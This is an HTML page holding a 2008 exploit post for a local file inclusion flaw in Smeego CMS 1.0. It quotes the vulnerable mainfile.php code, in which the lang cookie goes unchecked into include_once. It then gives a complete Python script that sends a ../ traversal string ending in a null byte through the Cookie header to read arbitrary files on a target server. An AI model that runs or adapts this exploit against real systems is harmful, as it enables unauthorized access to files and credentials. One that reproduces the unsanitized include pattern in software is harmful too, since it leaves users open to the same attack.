<html><head><title>Smeego 1.0 (Cookie lang) Local File Inclusion Exploit</title></head><pre># Smeego CMS Local File Include Exploit
# by
# 0in from Dark-Coders Programming &amp; Security Group
# &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; http://dark-coders.4rh.eu &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
#--------------------------------------------------------
# Contact: 0in(dot)email[at]gmail(dot)com
#--------------------------------------------------------
# Greetings to: Die_Angel,suN8Hclf,m4r1usz,djlinux,doctor
#--------------------------------------------------------
# Description:
# Smeego is a Content Management System or Portal
# System written in PHP and designed to be
# easy to install and use. Smeego has a mature code
# and comes with cool modules and themes
# for you to start your own dynamic and database
# driven website. Bla bla Bla [...]
# -------------------------------------------------------
# Script home: http://smeego.com
# -------------------------------------------------------
# Vuln:
# &gt;&gt;&gt;&gt;&gt;&gt; File: mainfile.php &lt;&lt;&lt;&lt;&lt;&lt;&lt;
#if ($display_errors == 1) { // We don't se any errors ;(
# @ini_set('display_errors', 1);
#} else {
# @ini_set('display_errors', 0);
#}
#
#if (isset($newlang)) {
#
# if (file_exists(&quot;language/lang-&quot;.$newlang.&quot;.php&quot;)) {
# setcookie(&quot;lang&quot;,$newlang,time()+31536000);
# include_once(&quot;language/lang-&quot;.$newlang.&quot;.php&quot;);
# $currentlang = $newlang;
# } else {
# setcookie(&quot;lang&quot;,$language,time()+31536000);
# include_once(&quot;language/lang-&quot;.$language.&quot;.php&quot;);
# $currentlang = $language;
# }
#} elseif (isset($lang)) {
#
# include_once(&quot;language/lang-&quot;.$lang.&quot;.php&quot;);
# $currentlang = $lang;
#} else {
# setcookie(&quot;lang&quot;,$language,time()+31536000);
# include_once(&quot;language/lang-&quot;.$language.&quot;.php&quot;);
# $currentlang = $language;
#}
# &gt;&gt;&gt;&gt;&gt;&gt; End &lt;&lt;&lt;&lt;&lt;&lt;&lt;
# So.. We can send Cookie: lang=[lfi]

# -------------------------------------------------------

# Simple Python Exploit:

#!/usr/bin/python
import sys
import time
import httplib
print '====================================================='
print ' Smeego CMS Local File INclude Exploit '
print ' by '
print ' 0in from Dark-Coders Programming &amp; Security Group! '
print ' http://dark-coders.4rh.eu '
print '====================================================='
try:
target=sys.argv[1]
path=sys.argv[2]
file=sys.argv[3]
except Exception:
print '\nUse: %s [target] [path] [file]' % sys.argv[0]
quit()
i=0
lfi='../'
target+=&quot;:80&quot;
special=&quot;%00&quot;
file+=special
for i in range(9):
lfi+=&quot;../&quot;
print '---------------------------------------------------------'
mysock=httplib.HTTPConnection(target)
mysock=httplib.HTTPConnection(target)
mysock.putrequest(&quot;GET&quot;,path)
mysock.putheader(&quot;User-Agent&quot;,&quot;Billy Explorer v666&quot;)
mysock.putheader('Accept', 'text/html')
mysock.putheader('Accept-Language',' en-us,en;q=0.5')
mysock.putheader('Cookie','lang=%s%s' % (lfi,file))
mysock.endheaders()
reply=mysock.getresponse()
print reply.read()
time.sleep(2)
mysock.close()
print '----------------------------------------------------------'

#EOFF

# milw0rm.com [2008-05-17]</pre></html>